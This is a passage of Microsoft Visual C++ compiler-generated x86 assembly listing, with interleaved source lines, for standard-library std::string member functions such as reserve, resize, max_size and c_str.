?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXI@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Eos
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Become_small@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ
_TEXT	SEGMENT
__Al$ = -24						; size = 4
tv86 = -20						; size = 4
tv88 = -16						; size = 4
__Ptr$ = -12						; size = 4
_this$ = -8						; size = 4
__My_data$ = -4						; size = 4
?_Become_small@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Become_small, COMDAT
; _this$ = ecx

; 4841 :     _CONSTEXPR20 void _Become_small() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4842 :         // release any held storage and return to small string mode
; 4843 :         auto& _My_data = _Mypair._Myval2;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 fc	 mov	 DWORD PTR __My_data$[ebp], eax

; 4844 :         _STL_INTERNAL_CHECK(_My_data._Large_mode_engaged());
; 4845 :         _STL_INTERNAL_CHECK(_My_data._Mysize <= _Small_string_capacity);
; 4846 : 
; 4847 :         _My_data._Orphan_all();

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4848 :         _ASAN_STRING_REMOVE(*this);
; 4849 :         const pointer _Ptr = _My_data._Bx._Ptr;

  00017	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0001a	8b 11		 mov	 edx, DWORD PTR [ecx]
  0001c	89 55 f4	 mov	 DWORD PTR __Ptr$[ebp], edx

; 4850 :         _My_data._Bx._Switch_to_buf();

  0001f	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00022	e8 00 00 00 00	 call	 ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Switch_to_buf

; 4851 :         _Traits::copy(_My_data._Bx._Buf, _Unfancy(_Ptr), _My_data._Mysize + 1);

  00027	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  0002a	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0002d	83 c1 01	 add	 ecx, 1
  00030	89 4d f0	 mov	 DWORD PTR tv88[ebp], ecx
  00033	8b 55 f4	 mov	 edx, DWORD PTR __Ptr$[ebp]
  00036	52		 push	 edx
  00037	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  0003c	83 c4 04	 add	 esp, 4
  0003f	89 45 ec	 mov	 DWORD PTR tv86[ebp], eax
  00042	8b 45 f0	 mov	 eax, DWORD PTR tv88[ebp]
  00045	50		 push	 eax
  00046	8b 4d ec	 mov	 ecx, DWORD PTR tv86[ebp]
  00049	51		 push	 ecx
  0004a	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  0004d	52		 push	 edx
  0004e	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  00053	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4852 :         auto& _Al = _Getal();

  00056	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00059	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  0005e	89 45 e8	 mov	 DWORD PTR __Al$[ebp], eax

; 4853 :         _Deallocate_for_capacity(_Al, _Ptr, _My_data._Myres);

  00061	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  00064	8b 48 14	 mov	 ecx, DWORD PTR [eax+20]
  00067	51		 push	 ecx
  00068	8b 55 f4	 mov	 edx, DWORD PTR __Ptr$[ebp]
  0006b	52		 push	 edx
  0006c	8b 45 e8	 mov	 eax, DWORD PTR __Al$[ebp]
  0006f	50		 push	 eax
  00070	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAXAAV?$allocator@D@2@QADI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Deallocate_for_capacity
  00075	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4854 :         _My_data._Myres = _Small_string_capacity;

  00078	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0007b	c7 41 14 0f 00
	00 00		 mov	 DWORD PTR [ecx+20], 15	; 0000000fH

; 4855 :     }

  00082	8b e5		 mov	 esp, ebp
  00084	5d		 pop	 ebp
  00085	c3		 ret	 0
?_Become_small@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Become_small
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z
_TEXT	SEGMENT
tv74 = -12						; size = 4
tv76 = -8						; size = 4
_this$ = -4						; size = 4
__Requested$ = 8					; size = 4
?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth, COMDAT
; _this$ = ecx

; 4773 :     _NODISCARD _CONSTEXPR20 size_type _Calculate_growth(const size_type _Requested) const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4774 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
  00011	89 45 f8	 mov	 DWORD PTR tv76[ebp], eax
  00014	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00017	8b 48 14	 mov	 ecx, DWORD PTR [eax+20]
  0001a	89 4d f4	 mov	 DWORD PTR tv74[ebp], ecx
  0001d	8b 55 f8	 mov	 edx, DWORD PTR tv76[ebp]
  00020	52		 push	 edx
  00021	8b 45 f4	 mov	 eax, DWORD PTR tv74[ebp]
  00024	50		 push	 eax
  00025	8b 4d 08	 mov	 ecx, DWORD PTR __Requested$[ebp]
  00028	51		 push	 ecx
  00029	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAIIII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
  0002e	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4775 :     }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c2 04 00	 ret	 4
?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAIIII@Z
_TEXT	SEGMENT
$T1 = -8						; size = 4
__Masked$ = -4						; size = 4
__Requested$ = 8					; size = 4
__Old$ = 12						; size = 4
__Max$ = 16						; size = 4
?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAIIII@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth, COMDAT

; 4760 :         const size_type _Requested, const size_type _Old, const size_type _Max) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00006	8b 45 08	 mov	 eax, DWORD PTR __Requested$[ebp]
  00009	83 c8 0f	 or	 eax, 15			; 0000000fH
  0000c	89 45 fc	 mov	 DWORD PTR __Masked$[ebp], eax

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR __Masked$[ebp]
  00012	3b 4d 10	 cmp	 ecx, DWORD PTR __Max$[ebp]
  00015	76 05		 jbe	 SHORT $LN2@Calculate_

; 4763 :             return _Max;

  00017	8b 45 10	 mov	 eax, DWORD PTR __Max$[ebp]
  0001a	eb 31		 jmp	 SHORT $LN1@Calculate_
$LN2@Calculate_:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  0001c	8b 55 0c	 mov	 edx, DWORD PTR __Old$[ebp]
  0001f	d1 ea		 shr	 edx, 1
  00021	8b 45 10	 mov	 eax, DWORD PTR __Max$[ebp]
  00024	2b c2		 sub	 eax, edx
  00026	39 45 0c	 cmp	 DWORD PTR __Old$[ebp], eax
  00029	76 05		 jbe	 SHORT $LN3@Calculate_

; 4767 :             return _Max;

  0002b	8b 45 10	 mov	 eax, DWORD PTR __Max$[ebp]
  0002e	eb 1d		 jmp	 SHORT $LN1@Calculate_
$LN3@Calculate_:

; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  00030	8b 4d 0c	 mov	 ecx, DWORD PTR __Old$[ebp]
  00033	d1 e9		 shr	 ecx, 1
  00035	03 4d 0c	 add	 ecx, DWORD PTR __Old$[ebp]
  00038	89 4d f8	 mov	 DWORD PTR $T1[ebp], ecx
  0003b	8d 55 f8	 lea	 edx, DWORD PTR $T1[ebp]
  0003e	52		 push	 edx
  0003f	8d 45 fc	 lea	 eax, DWORD PTR __Masked$[ebp]
  00042	50		 push	 eax
  00043	e8 00 00 00 00	 call	 ??$max@I@std@@YAABIABI0@Z ; std::max<unsigned int>
  00048	83 c4 08	 add	 esp, 8
  0004b	8b 00		 mov	 eax, DWORD PTR [eax]
$LN1@Calculate_:

; 4771 :     }

  0004d	8b e5		 mov	 esp, ebp
  0004f	5d		 pop	 ebp
  00050	c3		 ret	 0
?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAIIII@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE_NXZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
tv68 = -4						; size = 4
?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE_NXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty, COMDAT
; _this$ = ecx

; 4276 :     _NODISCARD_EMPTY_MEMBER _CONSTEXPR20 bool empty() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4277 :         return _Mypair._Myval2._Mysize == 0;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 78 10 00	 cmp	 DWORD PTR [eax+16], 0
  00010	75 09		 jne	 SHORT $LN3@empty
  00012	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv68[ebp], 1
  00019	eb 07		 jmp	 SHORT $LN4@empty
$LN3@empty:
  0001b	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv68[ebp], 0
$LN4@empty:
  00022	0f b6 45 fc	 movzx	 eax, BYTE PTR tv68[ebp]

; 4278 :     }

  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c3		 ret	 0
?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE_NXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?reserve@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXI@Z
_TEXT	SEGMENT
__Old_size$1 = -12					; size = 4
_this$ = -8						; size = 4
$T2 = -1						; size = 1
__Newcap$ = 8						; size = 4
?reserve@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXI@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::reserve, COMDAT
; _this$ = ecx

; 4246 :     void reserve(_CRT_GUARDOVERFLOW const size_type _Newcap = 0) { // determine new minimum length of allocated storage

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4247 :         if (_Mypair._Myval2._Mysize > _Newcap) { // requested capacity is not large enough for current size, ignore

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0000f	3b 4d 08	 cmp	 ecx, DWORD PTR __Newcap$[ebp]
  00012	76 02		 jbe	 SHORT $LN2@reserve

; 4248 :             return; // nothing to do

  00014	eb 62		 jmp	 SHORT $LN1@reserve
$LN2@reserve:

; 4249 :         }
; 4250 : 
; 4251 :         if (_Mypair._Myval2._Myres == _Newcap) { // we're already at the requested capacity

  00016	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00019	8b 42 14	 mov	 eax, DWORD PTR [edx+20]
  0001c	3b 45 08	 cmp	 eax, DWORD PTR __Newcap$[ebp]
  0001f	75 02		 jne	 SHORT $LN3@reserve

; 4252 :             return; // nothing to do

  00021	eb 55		 jmp	 SHORT $LN1@reserve
$LN3@reserve:

; 4253 :         }
; 4254 : 
; 4255 :         if (_Mypair._Myval2._Myres < _Newcap) { // reallocate to grow

  00023	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00026	8b 51 14	 mov	 edx, DWORD PTR [ecx+20]
  00029	3b 55 08	 cmp	 edx, DWORD PTR __Newcap$[ebp]
  0002c	73 2d		 jae	 SHORT $LN4@reserve

; 4256 :             const size_type _Old_size = _Mypair._Myval2._Mysize;

  0002e	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00031	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  00034	89 4d f4	 mov	 DWORD PTR __Old_size$1[ebp], ecx

; 4257 :             _Reallocate_grow_by(

  00037	33 d2		 xor	 edx, edx
  00039	88 55 ff	 mov	 BYTE PTR $T2[ebp], dl
  0003c	0f b6 45 ff	 movzx	 eax, BYTE PTR $T2[ebp]
  00040	50		 push	 eax
  00041	8b 4d 08	 mov	 ecx, DWORD PTR __Newcap$[ebp]
  00044	2b 4d f4	 sub	 ecx, DWORD PTR __Old_size$1[ebp]
  00047	51		 push	 ecx
  00048	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0004b	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_67d87d4aa1269033985980465fd1d824>@@$$V@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_67d87d4aa1269033985980465fd1d824>@@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_67d87d4aa1269033985980465fd1d824> >

; 4258 :                 _Newcap - _Old_size, [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size) {
; 4259 :                     _Traits::copy(_New_ptr, _Old_ptr, _Old_size + 1);
; 4260 :                 });
; 4261 : 
; 4262 :             _Mypair._Myval2._Mysize = _Old_size;

  00050	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00053	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$1[ebp]
  00056	89 42 10	 mov	 DWORD PTR [edx+16], eax

; 4263 :             return;

  00059	eb 1d		 jmp	 SHORT $LN1@reserve
$LN4@reserve:

; 4264 :         }
; 4265 : 
; 4266 :         if (_Newcap <= _Small_string_capacity && _Mypair._Myval2._Large_mode_engaged()) {

  0005b	83 7d 08 0f	 cmp	 DWORD PTR __Newcap$[ebp], 15 ; 0000000fH
  0005f	77 17		 ja	 SHORT $LN5@reserve
  00061	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00064	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_mode_engaged
  00069	0f b6 c8	 movzx	 ecx, al
  0006c	85 c9		 test	 ecx, ecx
  0006e	74 08		 je	 SHORT $LN5@reserve

; 4267 :             // deallocate everything; switch back to "small" mode
; 4268 :             _Become_small();

  00070	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00073	e8 00 00 00 00	 call	 ?_Become_small@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Become_small
$LN5@reserve:
$LN1@reserve:

; 4269 :             return;
; 4270 :         }
; 4271 : 
; 4272 :         // ignore requests to reserve to [_Small_string_capacity + 1, _Myres)
; 4273 :     }

  00078	8b e5		 mov	 esp, ebp
  0007a	5d		 pop	 ebp
  0007b	c2 04 00	 ret	 4
?reserve@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXI@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::reserve
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXID@Z
_TEXT	SEGMENT
__Old_size$ = -8					; size = 4
_this$ = -4						; size = 4
__New_size$ = 8						; size = 4
__Ch$ = 12						; size = 1
?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXID@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::resize, COMDAT
; _this$ = ecx

; 4174 :     _CONSTEXPR20 void resize(_CRT_GUARDOVERFLOW const size_type _New_size, const _Elem _Ch = _Elem()) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4175 :         // determine new length, padding with _Ch elements as needed
; 4176 :         const size_type _Old_size = size();

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
  00011	89 45 f8	 mov	 DWORD PTR __Old_size$[ebp], eax

; 4177 :         if (_New_size <= _Old_size) {

  00014	8b 45 08	 mov	 eax, DWORD PTR __New_size$[ebp]
  00017	3b 45 f8	 cmp	 eax, DWORD PTR __Old_size$[ebp]
  0001a	77 0e		 ja	 SHORT $LN2@resize

; 4178 :             _Eos(_New_size);

  0001c	8b 4d 08	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0001f	51		 push	 ecx
  00020	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	e8 00 00 00 00	 call	 ?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Eos

; 4179 :         } else {

  00028	eb 14		 jmp	 SHORT $LN3@resize
$LN2@resize:

; 4180 :             append(_New_size - _Old_size, _Ch);

  0002a	0f b6 55 0c	 movzx	 edx, BYTE PTR __Ch$[ebp]
  0002e	52		 push	 edx
  0002f	8b 45 08	 mov	 eax, DWORD PTR __New_size$[ebp]
  00032	2b 45 f8	 sub	 eax, DWORD PTR __Old_size$[ebp]
  00035	50		 push	 eax
  00036	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00039	e8 00 00 00 00	 call	 ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ID@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
$LN3@resize:

; 4181 :         }
; 4182 :     }

  0003e	8b e5		 mov	 esp, ebp
  00040	5d		 pop	 ebp
  00041	c2 08 00	 ret	 8
?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXID@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::resize
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ
_TEXT	SEGMENT
$T1 = -24						; size = 4
$T2 = -20						; size = 4
__Storage_max$ = -16					; size = 4
__Alloc_max$ = -12					; size = 4
$T3 = -8						; size = 4
_this$ = -4						; size = 4
?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size, COMDAT
; _this$ = ecx

; 4165 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4166 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEABV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  00011	50		 push	 eax
  00012	e8 00 00 00 00	 call	 ?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAIABV?$allocator@D@2@@Z ; std::_Default_allocator_traits<std::allocator<char> >::max_size
  00017	83 c4 04	 add	 esp, 4
  0001a	89 45 f4	 mov	 DWORD PTR __Alloc_max$[ebp], eax

; 4167 :         const size_type _Storage_max = // can always store small string

  0001d	c7 45 f8 10 00
	00 00		 mov	 DWORD PTR $T3[ebp], 16	; 00000010H
  00024	8d 45 f8	 lea	 eax, DWORD PTR $T3[ebp]
  00027	50		 push	 eax
  00028	8d 4d f4	 lea	 ecx, DWORD PTR __Alloc_max$[ebp]
  0002b	51		 push	 ecx
  0002c	e8 00 00 00 00	 call	 ??$max@I@std@@YAABIABI0@Z ; std::max<unsigned int>
  00031	83 c4 08	 add	 esp, 8
  00034	8b 10		 mov	 edx, DWORD PTR [eax]
  00036	89 55 f0	 mov	 DWORD PTR __Storage_max$[ebp], edx

; 4168 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4169 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

  00039	8b 45 f0	 mov	 eax, DWORD PTR __Storage_max$[ebp]
  0003c	83 e8 01	 sub	 eax, 1
  0003f	89 45 ec	 mov	 DWORD PTR $T2[ebp], eax
  00042	e8 00 00 00 00	 call	 ?max@?$numeric_limits@H@std@@SAHXZ ; std::numeric_limits<int>::max
  00047	89 45 e8	 mov	 DWORD PTR $T1[ebp], eax
  0004a	8d 4d ec	 lea	 ecx, DWORD PTR $T2[ebp]
  0004d	51		 push	 ecx
  0004e	8d 55 e8	 lea	 edx, DWORD PTR $T1[ebp]
  00051	52		 push	 edx
  00052	e8 00 00 00 00	 call	 ??$min@I@std@@YAABIABI0@Z ; std::min<unsigned int>
  00057	83 c4 08	 add	 esp, 8
  0005a	8b 00		 mov	 eax, DWORD PTR [eax]

; 4170 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4171 :         );
; 4172 :     }

  0005c	8b e5		 mov	 esp, ebp
  0005e	5d		 pop	 ebp
  0005f	c3		 ret	 0
?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size, COMDAT
; _this$ = ecx

; 4161 :     _NODISCARD _CONSTEXPR20 size_type size() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4162 :         return _Mypair._Myval2._Mysize;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 40 10	 mov	 eax, DWORD PTR [eax+16]

; 4163 :     }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?data@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEPADXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?data@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEPADXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::data, COMDAT
; _this$ = ecx

; 4152 :     _NODISCARD _CONSTEXPR20 _Ret_z_ _Elem* data() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4153 :         return _Mypair._Myval2._Myptr();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEPADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr

; 4154 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?data@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEPADXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::data
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str, COMDAT
; _this$ = ecx

; 4143 :     _NODISCARD _CONSTEXPR20 _Ret_z_ const _Elem* c_str() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4144 :         return _Mypair._Myval2._Myptr();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QBEPBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr

; 4145 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXD@Z
_TEXT	SEGMENT
__Ptr$1 = -16						; size = 4
__Old_size$ = -12					; size = 4
